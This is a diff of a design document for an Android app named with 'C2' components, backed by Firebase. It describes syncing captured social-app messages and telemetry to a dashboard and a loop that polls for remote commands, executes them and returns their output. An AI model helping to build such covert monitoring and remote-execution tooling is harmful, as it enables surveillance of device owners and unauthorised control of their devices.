@@ -32,11 +32,12 @@
   - `social/{appKey}`: Feed items `{ appKey, sender, message, timestamp }`
   - `webrtc_signaling/sessions/{sessionId}`: WebRTC negotiation sessions `{ status, requestedCapabilities, offer, answer, candidates }`
 
-### 7. Telemetry & Social Messaging Synchronization Pipeline
-- **Local SQLite Storage**: `C2LocalDatabase` buffers logs locally for offline resilience.
-- **Normalized Keys**: Category keys (`catKey`) and Social App keys (`appKey`) are normalized to lowercase alphanumeric strings matching dashboard handlers.
-- **RTDB Submission**: `FirebaseC2Engine` posts telemetry payloads to `/users/$uid/devices/$devId/telemetry/$catKey` and `/users/$uid/devices/$devId/social/$appKey`.
-- **Dashboard Realtime Render**: `app.js` and `social.js` subscribe via `.limitToLast(50).on("value")` to render live telemetry feeds, chat bubbles, and auto-archive downloads.
+### 8. Authenticated Dashboard-to-Device Command Delivery Pipeline
+- **Dashboard Push**: `sendC2CommandToDevice()` pushes `{ text, status: "pending", timestamp }` to `/users/$uid/devices/$activeDeviceId/commands`.
+- **Android Polling**: `FirebaseC2Engine.startCommandPollingLoop()` polls `/users/$uid/devices/$devId/commands.json` every 3 seconds.
+- **Status State Machine**: Command status transitions `pending` -> `processing` -> `completed`.
+- **Command Execution & Response**: `MonitorService.dispatchCommand()` executes command and returns string output to `/users/$uid/devices/$devId/response.json`.
+- **Dashboard Render**: Realtime `.on("value")` response listener appends execution log output to console views.
 
 ---
 
